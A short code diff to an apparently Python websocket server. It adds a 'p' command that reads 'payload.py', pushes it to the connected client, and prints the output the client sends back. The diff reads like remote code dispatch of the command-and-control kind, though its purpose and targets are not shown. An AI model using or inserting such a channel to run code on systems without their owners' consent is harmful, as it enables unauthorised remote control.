@@ -16,6 +16,18 @@ async def echo(websocket, path):
             with open("exec.py", "r") as f:
                 msg_buffer += f.readlines()
                 cmd = msg_buffer.pop(0)
+        if cmd == "p":
+            with open("payload.py", "r") as f:
+                payload = f.read()
+                await websocket.send("[PAYLOAD]")
+                await websocket.send(payload)
+                while True:
+                    output = await websocket.recv()
+                    if output == "[EOL]":
+                        break
+                    print(output, flush=True)
+                await websocket.send("\"DONE\"")
+                continue
         # print("SEND:", cmd.strip())
         await websocket.send(cmd)
 
